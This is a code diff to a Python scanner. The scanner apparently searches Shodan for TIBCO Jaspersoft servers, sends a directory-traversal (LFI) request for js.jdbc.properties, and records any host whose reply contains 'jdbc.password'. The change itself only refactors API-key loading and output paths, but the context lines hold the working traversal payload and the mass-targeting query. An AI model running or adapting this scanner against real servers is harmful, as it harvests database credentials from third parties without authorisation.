@@ -14,7 +14,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOURAPIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'title:"TIBCO Jaspersoft:" port:"443" 1970"'
 FILE = "/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties"
 session = requests.Session()
@@ -35,7 +41,7 @@ def grab_file (IP,PORT,FILE):
 		response = session.get(URL, headers=headers, timeout=10, verify=False)
 		result = response.text
 		if 'jdbc.password' in result:
-			text_file = open("./cfg/jaspersoft.cfg", "a")
+			text_file = open_output("cfg/jaspersoft.cfg", "a")
 			text_file.write("https://"+IP+":"+PORT+"\n")
 			text_file.close()
 			print ("[*] Jaspersoft LFI... Found [*]\n")
